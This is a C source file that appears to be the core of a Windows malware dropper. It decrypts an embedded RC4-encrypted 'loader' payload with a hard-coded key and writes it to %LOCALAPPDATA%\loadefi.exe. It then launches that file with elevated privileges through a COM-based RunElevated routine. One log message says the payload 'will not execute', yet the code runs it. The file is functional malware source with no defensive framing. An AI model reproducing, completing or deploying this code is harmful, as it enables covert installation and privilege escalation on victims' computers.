#include "main.h"
#include <objbase.h>

extern BOOL LoadNtdllFuncs(VOID);
extern BOOL RunElevated(LPCWSTR lpszExecutable);

void Rc4Crypt(unsigned char* Data, long DataLen, unsigned char* Key, int KeyLen) {
    unsigned char S[256];
    int i, j = 0;
    unsigned char temp;

    for (i = 0; i < 256; i++) {
        S[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + Key[i % KeyLen]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }

    i = 0;
    j = 0;
    for (long k = 0; k < DataLen; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        Data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

BOOL DropFileOnly(unsigned char* PData, DWORD DwSize, LPCWSTR LpFileName) {
    DWORD BytesWritten = 0;
    HANDLE HFile = CreateFileW(LpFileName, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (HFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file (%ls): %lu\n", LpFileName, GetLastError());
        return FALSE;
    }

    if (!WriteFile(HFile, PData, DwSize, &BytesWritten, NULL) || BytesWritten != DwSize) {
        printf("[-] Write failed (%ls): %lu\n", LpFileName, GetLastError());
        CloseHandle(HFile);
        return FALSE;
    }

    CloseHandle(HFile);
    printf("[+] Payload written to disk (will not execute): %ls\n", LpFileName);
    return TRUE;
}

int main() {
    SYSTEM_INFO SI;
    WCHAR SzPayloadPath[MAX_PATH];
    unsigned char Key[] = "@uASdHBA&%*7ygLYXfWh%*xJWD3GR_yBSxK!";
    int KeyLen = strlen((char*)Key);
    HRESULT hr_init;

    /* Firstly, determine the CPU Architecture */
    GetNativeSystemInfo(&SI);
    switch (SI.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
        goto DropTheFile;

        /* Disable the other architectures */
    default:
        printf("[-] Unsupported architecture.\n");
        return 1;
    }

DropTheFile:
    /* Decrypt the Loader in memory */
    printf("[*] Decrypting payload...\n");
    Rc4Crypt(LoaderPayload, LoaderPayloadSize, Key, KeyLen);

    if (!LoadNtdllFuncs()) {
        wprintf(L"[-] Failed to resolve ntdll functions\n");
        return 1;
    }
    /* Expand %LOCALAPPDATA% environment variable to get the real path */
    DWORD DwRet = ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\loadefi.exe", SzPayloadPath, MAX_PATH);

    if (DwRet == 0 || DwRet > MAX_PATH) {
        printf("[-] Failed to create dynamic path. Error code: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] Dynamic Target Path: %ls\n", SzPayloadPath);

    /* Drop the Loader to Appdata/Local */
    if (DropFileOnly(LoaderPayload, LoaderPayloadSize, SzPayloadPath)) {
        printf("[+] Payload successfully written to AppData.\n");
    }
    else {
        printf("[-] Failed to write payload.\n");
        return 1;
    }

    /* Run the loader with UAC */
    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr_init)) {
        wprintf(L"[-] CoInitializeEx failed: 0x%08X\n", hr_init);
        return 1;
    }
    RunElevated(SzPayloadPath);
    CoUninitialize();

    return 0;
 }
